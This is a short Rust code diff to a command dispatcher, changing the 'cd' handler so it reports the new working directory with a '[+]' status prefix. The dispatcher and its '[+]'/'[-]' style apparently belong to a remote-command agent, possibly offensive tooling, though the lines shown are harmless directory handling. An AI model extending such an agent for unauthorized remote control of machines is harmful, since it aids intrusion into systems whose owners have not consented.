@@ -9,9 +9,12 @@ pub fn dispatch_common(command: &str, parameters: &str) -> Option<String> {
     let output = match command {
         "cd" => {
             let path = crate::extract_param(parameters, "path");
-            std::env::set_current_dir(&path)
-                .map(|_| String::new())
-                .unwrap_or_else(|e| format!("[-] {}", e))
+            match std::env::set_current_dir(&path) {
+                Ok(_) => std::env::current_dir()
+                    .map(|p| format!("[+] {}", p.display()))
+                    .unwrap_or_else(|_| "[+] done".into()),
+                Err(e) => format!("[-] {}", e),
+            }
         }
         "pwd" => std::env::current_dir()
             .map(|p| p.display().to_string())
